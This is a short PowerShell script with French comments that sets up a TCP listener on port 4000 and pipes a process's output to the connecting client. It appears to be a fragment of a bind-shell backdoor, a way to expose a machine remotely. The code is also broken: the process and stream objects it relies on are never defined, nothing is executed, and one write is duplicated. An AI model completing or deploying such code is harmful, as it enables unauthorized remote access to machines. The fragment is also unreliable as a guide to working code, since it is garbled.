# =======================================================
#Version: 1.0
# =======================================================

# =======================================================
#Déclaration des variables
# =======================================================
$port=4000;
$out = $null; 
$done = $false; 
$testing = 0;
$pos = 0; 
$i = 1;

# =======================================================
#Execution du code
# =======================================================

$endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port);
$listener = new-object System.Net.Sockets.TcpListener $endpoint;
$listener.start();
$client = $listener.AcceptTcpClient();

#Création des tampons mémoire pour les entrées et sorties
$inputstream = $process.StandardInput;
$outputstream = $process.StandardOutput;

#Pause de 1 sec
Start-Sleep 1

#Encode le stream en ASCII
$encoding = new-object System.Text.AsciiEncoding;
while($outputstream.Peek() -ne -1)
{
    $out += $encoding.GetString($outputstream.Read());
}

$stream.Write($encoding.GetBytes($out),0,$out.Length);
#Envoi et nettoyage des tampons
$stream.Write($encoding.GetBytes($out),0,$out.length);
$out = $null;
$string = $null;